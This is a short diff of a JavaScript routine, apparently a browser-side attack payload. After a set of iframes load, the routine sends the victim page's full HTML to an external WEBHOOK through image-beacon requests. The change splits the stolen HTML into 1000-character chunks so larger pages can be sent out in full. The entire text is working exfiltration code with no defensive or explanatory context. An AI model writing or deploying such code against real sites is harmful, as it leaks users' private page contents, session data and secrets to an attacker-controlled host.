@@ -19,7 +19,14 @@ async function run(a = 1000, b = 1100) {
 
     await Promise.all(promises);
 
-    new Image().src = WEBHOOK + "?data=" + encodeURIComponent(document.documentElement.outerHTML);
+
+    const data = document.documentElement.outerHTML;
+    const chunkSize = 1000;
+    
+    for (let i = 0; i < data.length; i += chunkSize) {
+        const chunk = data.slice(i, i + chunkSize);
+        new Image().src = WEBHOOK + "?part=" + i + "&data=" + encodeURIComponent(chunk);
+    }
 
     console.log("img executed after all iframes loaded");
 }
